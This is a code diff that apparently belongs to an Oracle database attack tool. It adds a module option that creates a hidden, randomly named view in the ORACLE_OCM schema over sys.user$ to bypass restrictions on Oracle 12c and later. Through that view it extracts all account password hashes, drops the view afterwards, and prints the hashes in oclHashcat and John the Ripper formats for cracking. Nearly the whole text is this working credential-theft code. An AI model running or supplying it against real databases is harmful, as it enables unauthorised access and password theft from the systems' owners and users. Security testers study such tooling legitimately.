@@ -5,7 +5,7 @@ from OracleDatabase import OracleDatabase
 import logging
 from Constants import *
 from Info import Info
-from Utils import checkOptionsGivenByTheUser
+from Utils import checkOptionsGivenByTheUser, generateRandomString
 
 class Passwords (OracleDatabase):
 	'''
@@ -94,6 +94,45 @@ class Passwords (OracleDatabase):
 				self.passwords = results
 		return True
 
+	def __tryToGetHashedPasswordsWithOracleOCM__(self, blacklistOfUsernames=[]):
+		'''
+		Try to get hashed password with Oracle_OCM to bypass restrictions (with system account for example) on 12c and +
+		Only valid on Oracle Database >= 12c
+		If username is in the blacklist (blacklistOfUsernames), the account is not returned in results
+		Return an Error object if a problem. Otherwise return True if hashes has been got. Otherwise False
+		'''
+		currentUsername = ""
+		self.__resetPasswordList__()
+		if self.isDBVersionHigherThan12():
+			logging.info("Trying to get hashes Oracle_OCM view ")
+			randomViewName = generateRandomString(length=10)
+			REQ_CREATE_VIEW = "CREATE VIEW oracle_ocm.{0} as select name, password, spare4 from sys.user$".format(randomViewName)
+			REQ_DELETE_VIEW = "DROP VIEW oracle_ocm.{0}".format(randomViewName)
+			REQ_GET_PWDS    = "SELECT name, password, spare4 FROM oracle_ocm.{0}".format(randomViewName)
+			status = self.__execPLSQL__(REQ_CREATE_VIEW)
+			if isinstance(status, Exception):
+				logging.info("Impossible to create the view in oracle_ocm: {0}".format(self.cleanError(status)))
+				return status
+			results = self.__execQuery__(query=REQ_GET_PWDS,ld=['name', 'password','spare4'])
+			status = self.__execPLSQL__(REQ_DELETE_VIEW)
+			if isinstance(status, Exception):
+				logging.error("Impossible to drop view in oracle_ocm: {0}".format(self.cleanError(status)))
+		else:
+			logging.info("Hashes can not be got with Oracle_OCM. This method is only valid when database is 12c or higher")
+			return False
+		if isinstance(results, Exception):
+			logging.info("Impossible to get hashed passwords: {0}".format(results))
+			return results
+		else:
+			logging.info("Get hashed passwords")
+			for anAccount in results:
+				currentUsername = anAccount['name']
+				if currentUsername in blacklistOfUsernames:
+					logging.debug( "The account {0} will be not in hashed password list because this account is locked".format(currentUsername))
+				else:
+					self.passwords.append(anAccount)
+		return True
+
 	def printPasswords (self):
 		'''
 		print passwords
@@ -154,7 +193,7 @@ def runPasswordsModule(args):
 	Run the Passwords module
 	'''
 	status = True
-	if checkOptionsGivenByTheUser(args,["test-module","get-passwords","get-passwords-from-history", "get-passwords-not-locked"]) == False : return EXIT_MISS_ARGUMENT
+	if checkOptionsGivenByTheUser(args,["test-module","get-passwords","get-passwords-ocm","get-passwords-from-history", "get-passwords-not-locked"]) == False : return EXIT_MISS_ARGUMENT
 	passwords = Passwords(args)
 	status = passwords.connection(stopIfError=True)
 	passwords.__getLockedUsernames__()
@@ -177,6 +216,18 @@ def runPasswordsModule(args):
 			passwords.printPasswordsJohn()
 		else : 
 			args['print'].badNews("Impossible to get hashed passwords: {0}".format(status))
+	if args['get-passwords-ocm'] == True :
+		args['print'].title("Try to get Oracle hashed passwords with an ORACLE_OCM view")
+		status = passwords.__tryToGetHashedPasswordsWithOracleOCM__()
+		if status == True :
+			args['print'].goodNews("Here are Oracle hashed passwords (some accounts can be locked):")
+			passwords.printPasswords()
+			args['print'].goodNews("Here are 10g Oracle hashed passwords for oclHashcat (some accounts can be locked):")
+			passwords.printPasswordsOclHashcat()
+			args['print'].goodNews("Here are 10g Oracle hashed passwords for John the Ripper (some accounts can be locked):")
+			passwords.printPasswordsJohn()
+		else :
+			args['print'].badNews("Impossible to get hashed passwords with an ORACLE_OCM view: {0}".format(status))
 	if args['get-passwords-not-locked'] == True :
 		args['print'].title("Try to get Oracle hashed passwords when the account is not locked")
 		blacklistOfUsernames = passwords.__getLockedUsernames__()
